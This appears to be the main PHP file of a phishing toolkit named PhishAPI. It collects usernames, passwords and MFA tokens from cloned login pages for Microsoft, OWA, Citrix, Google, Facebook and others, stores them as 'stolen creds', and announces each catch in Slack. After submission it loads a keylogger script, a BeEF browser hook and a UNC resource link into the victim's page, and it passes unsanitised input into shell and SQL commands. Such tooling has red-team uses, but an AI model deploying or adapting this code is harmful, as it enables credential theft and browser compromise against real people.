<?php

// Receives Required Parameters and Sets Variables
$ip = $_SERVER['REMOTE_ADDR'];
if(isset($_REQUEST['username'])){$user = $_REQUEST['username'];}else{$user = "";}
if(isset($_REQUEST['password'])){$pass = base64_encode($_REQUEST['password']);}else{$pass = "";}
if(isset($_REQUEST['project'])){$portal = $_REQUEST['project'];}else{$portal = "";}
if(isset($_REQUEST['redirect'])){$redirect = $_REQUEST['redirect'];}else{$redirect = "";}

// Receives Optional Parameters and Overrides Variables
if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "";}
if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}else{$slackemoji = ":fishing_pole_and_fish:";}
if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}else{$slackbotname = "PhishBot";}

// Makes Password Safe for DB
$user = stripslashes($user);

// Pulls in Required Connection Variables for DB
require_once 'config.php';

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Writes User and Password to a Local Log (In Case DB Insert Fails)
$myfile = fopen("/tmp/APIPhishingLogs.txt", "a") or die("Unable to open file!");
$txt = $user." ".$pass."\n\r\n\r";
fwrite($myfile, "\n". $txt);
fclose($myfile);

// Checks Trophy Awards
$sqltrophy = "CALL GetAwards('$portal','$user');";
$resulttrophy = $conn->query($sqltrophy);

while($row = $resulttrophy->fetch_assoc()) {

if($row["Title"] == "MostDedicated"){
$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDedicated.gif -F 'initial_comment=Third Times a Charm! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy);
}


if($row["Title"] == "MostDelayed"){
$cmdtrophy2 = "curl -F file=@awardgifs/TrophyMostDelayed.gif -F 'initial_comment=Partys over! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy2);
}

if($row["Title"] == "MostDisclosedPWs"){
$cmdtrophy3 = "curl -F file=@awardgifs/TrophyMostDisclosed.gif -F 'initial_comment=Here Try This One.. - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy3);
}


if($row["Title"] == "MostPhish"){
$cmdtrophy4 = "curl -F file=@awardgifs/TrophyMostPhish.gif -F 'initial_comment=Gonna need a bigger boat.. ".$row["username"]." phish! - ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy4);
}

}

printf($conn->error);
$conn->close();

$conn2 = mysqli_connect($servername, $username, $password, $dbname);

// Inserts Captured Information Into MySQL DB
$sql = "CALL InsertStolenCreds('$user','$pass','$ip','$portal','$MFAToken');";
$result = $conn2->query($sql);

printf($conn2->error);
$conn2->close();

}

?>

<?php if(isset($_REQUEST['fakesite'])){ ?>

<!-- INSERT PRE-POPULATED LOGON FORM OPTIONS HERE -->
<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="main.css">
<style>
textarea {
  width: 600px;
  height: 350px;
}
</style>
</HEAD>
<BODY>
<CENTER>
<BR>
<TABLE WIDTH="80%">
<FONT COLOR="#FFFFFF"><H1>Respository of Login Portals</H1><br></FONT>
<TR><TH WIDTH="100%" COLSPAN="3">Generic Portals</TH></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=generic1"><img src="templates/generic1portal.png" width="200"></a><br><br><b>Generic 1</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=generic2"><img src="templates/generic2portal.png" width="200"></a><br><br><b>Generic 2</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=generic3"><img src="templates/generic3portal.png" width="200"></a><br><br><b>Generic 3</b></TD></TR>
<TR><TH WIDTH="100%" COLSPAN="3">Corporate Services</TH></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=citrix"><img src="templates/citrixportal.png" width="200"></a><br><br><b>Citrix</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=microsoft"><img src="templates/microsoftportal.png" width="200"></a><br><br><b>Microsoft</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=anyconnect"><img src="templates/anyconnectportal.png" width="200"></a><br><br><b>AnyConnect</b></TD></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=owa"><img src="templates/owaportal.png" width="200"></a><br><br><b>OWA</b></TD><TD></TD><TD></TD></TR>
<TR><TH WIDTH="100%" COLSPAN="3">Social Media / Third Party Sites</TH></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=instagram"><img src="templates/instagramportal.png" width="200"></a><br><br><b>Instagram</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=wordpress"><img src="templates/wordpressportal.png" width="200"></a><br><br><b>WordPress</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=google"><img src="templates/googleportal.png" width="200"></a><br><br><b>Google</b></TD></TR>
<TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=facebook"><img src="templates/facebookportal.png" width="200"></a><br><br><b>Facebook</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=linkedin"><img src="templates/linkedinportal.png" width="200"></a><br><br><b>LinkedIn</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=twitter"><img src="templates/twitterportal.png" width="200"></a><br><br><b>Twitter</b></TD></TR>
</TABLE>
<BR><FONT COLOR="#FFFFFF" SIZE="3">Choose a default template, download the HTML, and customize however you'd like.  <br><br>For best results, host these landing pages on their own server to avoid having the API blacklisted for a certain campaign.  <br><br>Use SSL for both so there is no mixed-content.  These pages already contain the fields necessary for the API!</FONT>
<BR><BR>
<FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use Your Own HTML and Embed the API Tags</FONT><BR><BR>
<textarea style="text-align:left" class="js-emaillink">
<!-- LOCATION OF YOUR API TO POST TO -->
<FORM METHOD="POST" ACTION="<?php echo $APIDomain; ?>">

<!-- MAKE SURE INPUT FIELDS ARE NAMED AS FOLLOWS -->
<INPUT NAME="username">

<INPUT NAME="password">

<!-- NOT REQUIRED -->
<INPUT NAME="token">

<!-- UNIQUE PROJECT NAME FOR SORTING OF DATA ON BACKEND -->
<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">

<!-- LOCATION THE USER WILL BE REDIRECTED TO AFTER SUBMITTING CREDENTIALS -->
<INPUT NAME="redirect" VALUE="https://site_to_redirect_to" TYPE="hidden">

<!-- OPTIONAL SLACKBOT MODIFICATIONS FOR ALERTING -->
<INPUT NAME="slackbotname" VALUE="PhishBot" TYPE="hidden">

<INPUT NAME="slackemoji" VALUE=":fishing_pole_and_fish:" TYPE="hidden"></textarea>
<p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>

<script>
var copyEmailBtn = document.querySelector('.js-emailcopybtn');  
copyEmailBtn.addEventListener('click', function(event) {  
  // Select the email link anchor text  
  var emailLink = document.querySelector('.js-emaillink');  
  var range = document.createRange();  
  range.selectNode(emailLink);  
  window.getSelection().addRange(range);  

  try {  
    // Now that we've selected the anchor text, execute the copy command  
    var successful = document.execCommand('copy');  
    var msg = successful ? 'successful' : 'unsuccessful';  
    console.log('Copy email command was ' + msg);  
  } catch(err) {  
    console.log('Oops, unable to copy');  
  }  

  // Remove the selections - NOTE: Should use
  // removeRange(range) when it is supported  
  window.getSelection().removeAllRanges();  
});
</script>
</CENTER>
</BODY>
</HTML>

<?php } else {

if($redirect == false){ ?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="main.css">
</HEAD>
<BODY>
<BR><CENTER><FONT COLOR="#FFFFFF"><H1>Welcome to PhishAPI</H1>
<b>Choose an Option Below to Get Started!</b>
<BR><BR><BR>
<TABLE>
<TR><TH>Fake Portal</TH><TH>Weaponized Documents</TH><TH>Email Campaigns</TH></TR>
<TR><TD><a href="index.php?fakesite=1"><i class="fa fa-user fa-5X" aria-hidden="true" style="color: black;  font-size: 150px;"></i></a></TD><TD><a href="/phishingdocs/"><i class="fa fa-file-text fa-5X" aria-hidden="true"  style="color: black; font-size: 150px;"></a></TD><TD><a href="campaigns/"><i class="fa fa-envelope fa-5X" aria-hidden="true" style="color: black; font-size: 150px;"></i></a></TD></TR>
</TABLE>
</CENTER>
</BODY>
</HTML>

<?php } }

if($redirect != ""){

// See if Redirect Location Allows Iframes
$cmdredir = 'curl -s "'.$redirect.'" -I | grep -Fi X-Frame-Options';

exec($cmdredir,$outputredir);

if(isset($outputredir[0])){
?>
<HTML>
<HEAD>
<meta http-equiv="refresh" content="0;URL='<?php echo $redirect; ?>'" />

</HEAD>
</BODY>

<?php }}

if($redirect != false){

if($outputredir[0] == false){ ?>
<HTML>
<HEAD>
<style>
body {
    margin: 0;
}
</style>
</HEAD>
<BODY>
<iframe src="<?php echo $redirect; ?>" width="100%" height="100%" frameborder="0" sandbox="allow-forms allow-scripts" scrolling="no"></iframe>
<script src="https://<?php echo $_SERVER['SERVER_NAME'];?>/kl.js" type="text/javascript"></script>
<?php } ?>

<image height="1" width="1" xlink:href="\\<?php echo $_SERVER['SERVER_NAME'];?>/resource.jpg" />

<!--<iframe src="unc.php" width="0" height="0" frameborder="0" sandbox="allow-forms allow-scripts"></iframe>-->

<script src="<?php echo $BeefHookJSURL;?>:3000/hook.js" type="text/javascript"></script>

</BODY>
</HTML>

<?php }


$slacklink = "https://".$_SERVER['SERVER_NAME']."/results/index.php?project=".$portal;

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Only Proceed if There is a Password
if($pass != ""){

// Judge Password Complexity
if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).*$#", base64_decode($pass))){
    $passstrength = ":thumbsup:";
} else {
    $passstrength = ":poop:";
}

// Checks HaveIBeenPwned DB
$sha1pass = strtoupper(sha1(base64_decode($pass)));

$cmd2 = 'curl -s -X GET "https://api.pwnedpasswords.com/range/'.substr($sha1pass, 0, 5).'"';

exec($cmd2);

// Executes the curl command
exec($cmd2,$pwned);

$pwnedarray = array();
$arraywithcount = array();

foreach($pwned as $pwned2){
$pos = strpos($pwned2, ":");
$shahash = substr($pwned2, 0, strrpos($pwned2, ':'));
$hashcount = substr($pwned2, $pos + 1);
$arraywithcount[$shahash] = $hashcount;
$pwnedarray[] = substr($pwned2, 0, strrpos($pwned2, ':'));
}

if (in_array(substr($sha1pass, 5), $pwnedarray)) {
    $TroyHunt = "yes";

$haveibeenpwnedhits = $arraywithcount[substr($sha1pass, 5)];

// If the Password is so non-unique, give a Trophy
if ($haveibeenpwnedhits >= "3000"){
$cmdtrophy5 = "curl -F file=@awardgifs/TrophyLeastUniquePassword.gif -F 'initial_comment=That PW Gets Around.. (".number_format($haveibeenpwnedhits)." times!) - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy5);
}

} else $TroyHunt = "no";

// If the Password is Set, Change Slack Message
$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\n> Password Strength is ".$passstrength;

} else {

// If the Password is Not Set, Do Not Include Password Strength in Slack Message
$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";

}

if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";}

// Execute Slack Incoming Webhook
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';

exec($cmd);

}

?>
